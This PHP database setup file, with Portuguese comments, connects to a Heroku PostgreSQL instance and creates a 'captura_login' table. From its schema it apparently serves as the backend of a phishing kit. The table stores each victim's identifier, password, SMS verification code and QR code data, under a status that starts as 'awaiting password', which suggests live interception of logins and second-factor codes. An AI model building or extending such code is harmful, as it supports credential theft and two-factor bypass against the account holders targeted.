<?php
// db.php

// Pega a URL do banco de dados da variável de ambiente do Heroku.
$dbUrl = getenv('DATABASE_URL');

if (empty($dbUrl)) {
    // Se a variável de ambiente não estiver configurada, encerra a execução.
    die(json_encode(['success' => false, 'error' => 'DATABASE_URL não configurada.']));
}

$dbopts = parse_url($dbUrl);

$dbHost = $dbopts["host"];
$dbPort = $dbopts["port"];
$dbUser = $dbopts["user"];
$dbPass = $dbopts["pass"];
$dbName = ltrim($dbopts["path"], '/');
$dsn = "pgsql:host=$dbHost;port=$dbPort;dbname=$dbName";

try {
    // Tenta estabelecer a conexão com o banco de dados.
    $pdo = new PDO($dsn, $dbUser, $dbPass);
    $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);

    // Comando SQL para criar a tabela 'captura_login' SE ELA NÃO EXISTIR.
    // A nova coluna 'qrcode_text' foi adicionada aqui para garantir que novas instalações já a tenham.
    $sql_create_table = "
    CREATE TABLE IF NOT EXISTS captura_login (
        id SERIAL PRIMARY KEY,
        session_id VARCHAR(255) NOT NULL,
        identificador VARCHAR(255) NOT NULL,
        senha VARCHAR(255) NULL,
        sms_code VARCHAR(255) NULL,
        qrcode_path VARCHAR(255) NULL,
        qrcode_text TEXT NULL, -- << NOVA COLUNA ADICIONADA
        status VARCHAR(255) DEFAULT 'aguardando_senha',
        data_criacao TIMESTAMP WITH TIME ZONE DEFAULT CURRENT_TIMESTAMP
    );
    ";
    
    // Executa o comando de criação.
    $pdo->exec($sql_create_table);

    // --- AJUSTE ADICIONADO ---
    // Este comando garante que a coluna 'qrcode_text' seja adicionada à tabela se ela JÁ EXISTIR.
    // O 'IF NOT EXISTS' (para PostgreSQL) previne erros se o script rodar múltiplas vezes.
    $sql_alter_table = "ALTER TABLE captura_login ADD COLUMN IF NOT EXISTS qrcode_text TEXT NULL;";
    $pdo->exec($sql_alter_table);


} catch (PDOException $e) {
    // Se a conexão ou a alteração da tabela falhar, retorna um erro em JSON.
    header('Content-Type: application/json');
    http_response_code(500); // Internal Server Error
    die(json_encode(['success' => false, 'error' => 'Falha na conexão com o banco de dados: ' . $e->getMessage()]));
}

// A variável $pdo está agora disponível para qualquer script que inclua este arquivo.
?>